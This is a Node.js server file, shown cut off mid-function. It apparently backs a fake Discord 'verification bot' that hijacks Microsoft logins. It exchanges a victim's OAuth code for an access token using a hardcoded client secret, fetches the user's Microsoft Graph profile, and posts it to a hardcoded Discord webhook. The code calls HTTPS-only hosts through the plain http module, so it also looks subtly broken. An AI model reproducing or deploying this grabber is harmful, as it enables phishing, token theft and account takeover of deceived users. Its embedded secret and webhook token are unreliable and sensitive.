const http = require('http');
const url = require('url');
const querystring = require('querystring');

const server = http.createServer((req, res) => {
    if (req.method === 'GET' && req.url.startsWith('/redirect')) {
        const query = url.parse(req.url).query;
        const code = querystring.parse(query).code;

        const postData = querystring.stringify({
            grant_type: 'authorization_code',
            client_id: 'a1ad2d37-7be9-4db9-bad1-e457f14e2e1b',
            client_secret: 'e92eb957-6e2f-43ad-a233-dfbec6cadc86',
            code: code,
            redirect_uri: 'https://discord-verification-bot-79dd.onrender.com/'
        });

        const options = {
            hostname: 'login.microsoftonline.com',
            path: '/common/oauth2/v2.0/token',
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': postData.length
            }
        };

        const postReq = http.request(options, (postRes) => {
            let data = '';

            postRes.on('data', (chunk) => {
                data += chunk;
            });

            postRes.on('end', () => {
                const access_token = JSON.parse(data).access_token;

                const getOptions = {
                    hostname: 'graph.microsoft.com',
                    path: '/v1.0/me',
                    headers: {
                        'Authorization': 'Bearer ' + access_token
                    }
                };

                const getReq = http.get(getOptions, (getRes) => {
                    let data = '';

                    getRes.on('data', (chunk) => {
                        data += chunk;
                    });

                    getRes.on('end', () => {
                        const user = JSON.parse(data);

                        const webhookOptions = {
                            hostname: 'discord.com',
                            path: '/api/webhooks/1065835230621081684/CwV2UA-Fg7iT42kf4SqeL_3DBCNL9xyb9zw5ZSpeP7k-W_VHkOgY35j0fbilaswbk_PW',
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            }
                        };

                        const webhookReq = http.request(webhookOptions, (webhookRes) => {
                            webhookRes.on('end', () => {
                                res.writeHead(200, {'Content-Type': 'text/plain'});
                                res.end('Your information was sent to the webhook.');
                            });
                        });

                       
